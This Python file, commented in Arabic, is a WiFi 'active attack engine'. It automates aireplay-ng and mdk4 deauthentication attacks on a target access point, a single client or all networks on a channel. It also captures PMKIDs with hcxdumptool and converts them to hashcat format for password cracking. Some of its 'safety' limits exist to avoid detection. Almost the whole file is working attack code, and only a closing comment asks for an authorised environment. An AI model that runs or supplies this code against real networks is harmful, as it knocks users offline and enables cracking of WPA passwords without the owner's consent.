#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WiFiNexus Guardian - Active Attack Engine
المحرك الهجومي النشط: Deauthentication, Disassociation, PMKID Capture
المطور: Ahmed Mostafa Ibrahim (Finovate – AHMED EG)
الإصدار: 1.1.0 Pro
"""

import subprocess
import time
import re
import os
import signal
import sys
from typing import Optional, List, Dict
from datetime import datetime

class ActiveAttackEngine:
    """
    محرك متقدم للهجمات النشطة على شبكات WiFi
    يدعم: Deauth, Disassoc, PMKID Capture, CCKM
    """
    
    def __init__(self, interface: str, safety_mode: bool = True):
        self.interface = interface
        self.safety_mode = safety_mode
        self.process = None
        self.attacks_log = []
        self.is_running = False
        
        # حدود الأمان لمنع حظر الجهاز أو الضرر
        self.max_deauth_packets = 10  # حزمة واحدة كل فترة كافية
        self.attack_duration_limit = 60  # ثانية
        
        print(f"[+] تهيئة محرك الهجوم النشط على الواجهة: {interface}")
        if safety_mode:
            print("[!] وضع الأمان مفعل: تم تحديد حدود زمنية وعدد حزم لتجنب الكشف أو الضرر.")

    def check_dependencies(self) -> bool:
        """التحقق من وجود الأدوات المطلوبة (aireplay-ng, mdk4, hcxdumptool)"""
        tools = ['aireplay-ng', 'hcxdumptool']
        missing = []
        for tool in tools:
            try:
                subprocess.run([tool, '--help'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
            except (subprocess.CalledProcessError, FileNotFoundError):
                missing.append(tool)
        
        if missing:
            print(f"[-] أدوات مفقودة ضرورية للهجوم النشط: {', '.join(missing)}")
            print("[*] يرجى تثبيت aircrack-ng و hcxdumptool")
            return False
        return True

    def send_deauth(self, target_bssid: str, client_mac: Optional[str] = None, count: int = 10, duration: int = 5) -> bool:
        """
        إرسال حزم إلغاء المصادقة (Deauthentication)
        الهدف: إجبار العميل على إعادة الاتصال وكشف الهاند شيك
        """
        if self.safety_mode and count > self.max_deauth_packets:
            print(f"[!] وضع الأمان: تقليل عدد الحزم من {count} إلى {self.max_deauth_packets}")
            count = self.max_deauth_packets

        print(f"[*] بدء هجوم Deauth على {target_bssid} ...")
        
        cmd = []
        # محاولة استخدام aireplay-ng أولاً
        if client_mac:
            # هجوم موجه لعميل محدد (أكثر فعالية وأقل ضجيجاً)
            cmd = ['aireplay-ng', '-0', str(count), '-a', target_bssid, '-c', client_mac, self.interface]
            print(f"   -> استهداف العميل: {client_mac}")
        else:
            # هجوم بث عام (Broadcast) - قد يكون غير مستقر في بعض الكروت
            cmd = ['aireplay-ng', '-0', str(count), '-a', target_bssid, self.interface]
            print("   -> هجوم broadcast عام")

        try:
            # تشغيل العملية في الخلفية لمراقبة الإخراج
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            start_time = time.time()
            while self.process.poll() is None:
                if time.time() - start_time > duration:
                    self.stop_attack()
                    break
                time.sleep(0.5)
            
            if self.process.returncode == 0 or self.process.returncode is None:
                print(f"[+] تم إرسال حزم Deauth بنجاح.")
                self._log_attack("Deauth", target_bssid, client_mac, "Success")
                return True
            else:
                stderr = self.process.stderr.read()
                print(f"[-] فشل الهجوم: {stderr}")
                return False
                
        except Exception as e:
            print(f"[-] خطأ أثناء هجوم Deauth: {str(e)}")
            return False

    def capture_pmkid(self, target_bssid: str, output_file: str, timeout: int = 30) -> bool:
        """
        التقاط PMKID مباشرة من نقطة الوصول (بدون الحاجة لعميل متصل)
        هذه الطريقة أكثر هدوءاً وفعالية مع الشبكات الحديثة (WPA2/3)
        """
        print(f"[*] بدء محاولة استخراج PMKID من {target_bssid} ...")
        
        # استخدام hcxdumptool لالتقاط PMKID
        # ملاحظة: يتطلب وضع المراقبة غالباً، لكننا سنحاول الهجين
        cmd = [
            'hcxdumptool',
            '-i', self.interface,
            '-o', f"{output_file}.pcapng",
            '--enable_status=1',
            '--filtermode=2', # قائمة السماح
            '--filterlist_ap', target_bssid.replace(':', '')
        ]

        try:
            print(f"   -> تشغيل hcxdumptool لمدة {timeout} ثانية...")
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            start_time = time.time()
            while self.process.poll() is None:
                if time.time() - start_time > timeout:
                    self.stop_attack()
                    break
                time.sleep(1)
            
            # التحقق من الملف الناتج
            if os.path.exists(f"{output_file}.pcapng"):
                # تحويل PCAPNG إلى PMKID Hash لـ Hashcat
                convert_cmd = ['hcxpcapngtool', '-o', f"{output_file}.16800", f"{output_file}.pcapng"]
                try:
                    subprocess.run(convert_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    print(f"[+] تم التقاط PMKID بنجاح! الملف: {output_file}.16800")
                    self._log_attack("PMKID_Capture", target_bssid, None, "Success")
                    return True
                except:
                    print("[!] تم التقاط البيانات ولكن فشل التحويل (ربما تحتاج hcxtools). الملف الخام محفوظ.")
                    return True
            
            print("[-] فشل التقاط PMKID في الوقت المحدد.")
            return False

        except Exception as e:
            print(f"[-] خطأ أثناء التقاط PMKID: {str(e)}")
            return False

    def mdk4_deauth(self, target_bssid: Optional[str] = None, duration: int = 10) -> bool:
        """
        استخدام MDK4 لهجوم Deauth أكثر قوة وتخصيصاً
        """
        if not self.check_dependencies(): # يحتاج تحقق خاص بـ mdk4
             # تحقق بسيط من وجود الأمر
             try:
                 subprocess.run(['mdk4', '--help'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             except:
                 print("[-] أداة mdk4 غير مثبتة.")
                 return False

        print(f"[*] بدء هجوم MDK4 Deauth ...")
        
        # إنشاء ملف قائمة سوداء إذا كان هناك هدف محدد
        blacklist_file = "/tmp/mdk4_blacklist.txt"
        mode = "d" # Deauth
        args = []
        
        if target_bssid:
            with open(blacklist_file, 'w') as f:
                f.write(target_bssid + "\n")
            args = ['-f', blacklist_file]
            print(f"   -> استهداف BSSID: {target_bssid}")
        else:
            print("   -> استهداف جميع الشبكات في القناة (احذر!)")

        cmd = ['mdk4', self.interface, mode] + args
        
        try:
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(duration)
            self.stop_attack()
            print("[+] انتهى هجوم MDK4.")
            return True
        except Exception as e:
            print(f"[-] خطأ في MDK4: {str(e)}")
            return False

    def stop_attack(self):
        """إيقاف فوري لأي هجوم نشط"""
        if self.process:
            print("\n[!] إيقاف الهجوم النشط...")
            try:
                # إرسال SIGINT أولاً لمحاولة الإغلاق النظيف
                self.process.send_signal(signal.SIGINT)
                try:
                    self.process.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    # إذا لم يستجب، فرض الإيقاف
                    self.process.kill()
                    self.process.wait()
                
                # تنظيف عمليات aireplay-ng العالقة أحياناً
                subprocess.run(['killall', '-9', 'aireplay-ng'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['killall', '-9', 'mdk4'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['killall', '-9', 'hcxdumptool'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                print("[+] تم تنظيف العمليات بنجاح.")
                self.is_running = False
                self.process = None
            except Exception as e:
                print(f"[-] خطأ أثناء الإيقاف: {str(e)}")

    def _log_attack(self, attack_type: str, target: str, client: Optional[str], status: str):
        """تسجيل تفاصيل الهجوم للتقارير"""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "type": attack_type,
            "target_bssid": target,
            "client_mac": client,
            "status": status,
            "interface": self.interface
        }
        self.attacks_log.append(log_entry)
        # يمكن هنا الكتابة لملف JSON خارجي

    def continuous_monitor_attack(self, target_bssid: str, interval: int = 30, cycles: int = 5):
        """
        هجوم دوري ذكي: يهاجم لفترة قصيرة ثم ينتظر لالتقاط الهاند شيك
        يقلل من ضجيج الشبكة ويزيد فرص النجاح
        """
        print(f"[*] بدء الهجوم الدوري المستهدف: {target_bssid}")
        print(f"   -> الدورة: هجوم {self.max_deauth_packets} حزم كل {interval} ثانية.")
        
        for i in range(cycles):
            if not self.is_running: break
            
            print(f"\n[دورة {i+1}/{cycles}]")
            success = self.send_deauth(target_bssid, count=self.max_deauth_packets, duration=3)
            
            if success:
                print(f"   -> انتظار {interval} ثانية لالتقاط الاستجابة...")
                # هنا يمكن دمج مع HandshakeCapturer للتحقق الفوري
                time.sleep(interval)
            else:
                print("   -> فشل الهجوم، تجاوز الدورة.")
                time.sleep(5)

        print("[+] انتهى الهجوم الدوري.")

if __name__ == "__main__":
    # اختبار سريع (يتطلب صلاحيات Root وواجهة في وضع المراقبة)
    print("=== اختبار محرك الهجوم النشط ===")
    # تحذير: لا تشغل هذا إلا في بيئة معزولة مصرح بها
    print("هذا السكربت للاختبار فقط. يتطلب واجهة حقيقية.")
    # engine = ActiveAttackEngine("wlan0mon")
    # engine.send_deauth("AA:BB:CC:DD:EE:FF")
